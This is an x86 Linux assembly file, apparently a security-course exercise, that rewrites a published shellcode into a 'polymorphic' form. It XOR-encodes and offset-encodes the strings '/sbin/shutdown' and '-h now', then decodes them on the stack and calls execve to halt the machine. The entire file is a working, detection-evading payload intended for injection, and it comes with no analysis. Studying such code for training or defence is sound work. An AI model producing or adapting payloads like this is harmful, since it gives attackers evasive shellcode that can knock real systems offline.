; Polymorphic version of http://shell-storm.org/shellcode/files/shellcode-876.php
; 83 bytes (original 56 bytes)
; Kaddouch Guillaume
; SLAE-681

global _start

section .text

_start:
	;int execve(const char *filename, char *const argv[], char *const envp[]

	xor eax, eax			; zero out eax
	push eax			; push NULL terminating string

	push word 0xc287		; XORed '-h' with 0xAA
	xor word [esp], 0xaaaa		; XOR back string to clear text '-h'
	push eax			; push NULL
	push dword 0x776f6eAA		; = 'now'
	mov [esp], byte al		; \x00 = NULL
	mov edi, esp			; edi = *'-h now'

	push eax			; push NULL

	mov ebx, dword 0xc4ddc5ce		; XORed 'down' with 0xAA
	xor ebx, 0xaaaaaaaa			; XOR back the string to clear text
	push ebx				; string 'down'

	mov ebx, dword 0x63645762		; encoded 'shut' decreased by 0x11111111
	add ebx, 0x11111111			; convert back the string to clear text
	push ebx				; string 'shut'

        mov ebx, dword 0x85c4c3c8		; XORed 'bin/' with 0xAA
	xor ebx, 0xaaaaaaaa			; XOR back the string to clear text
	push ebx				; string 'bin/'

	mov bx, 0x6129				; encoded '/s' decreased by 0x1206
	add bx, 0x1206				; convert back the string to clear text
	push bx					; string '/s'

	; clear string on stack = /sbin/shutdown

	mov ebx, esp			; ebx = *filename '/sbin///shutdown' 0x00

	push eax
	push edi			; edi = *argv '-h now'
	push ebx			; *filename '/sbin///shutdown' 0x00
	mov ecx,esp			; ecx = *argv[*filename '/sbin///shutdown' '-h'

	; ebx = *filename
	; ecx = *argv[*filename, *'-h now']
	; edx = *envp = 0x00

	mov al,0xb			; execve() syscall number
	int 0x80			; execve(*/sbin///shutdown, *-h now, 0x00)

